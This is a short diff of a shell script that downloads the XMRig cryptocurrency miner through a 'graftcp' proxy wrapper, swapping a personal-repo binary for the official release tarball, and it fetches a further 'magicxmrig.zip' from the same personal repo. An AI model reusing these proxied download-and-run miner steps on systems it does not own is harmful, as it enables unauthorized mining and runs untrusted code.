@@ -35,7 +35,9 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/oksila54/mini/raw/main/xmrig
+./graftcp/graftcp wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz
+tar -zxf xmrig-6.19.0-linux-x64.tar.gz
+cd xmrig-6.19.0
 chmod +x xmrig
 
 ./graftcp/graftcp wget https://github.com/oksila54/mini/raw/main/magicxmrig.zip
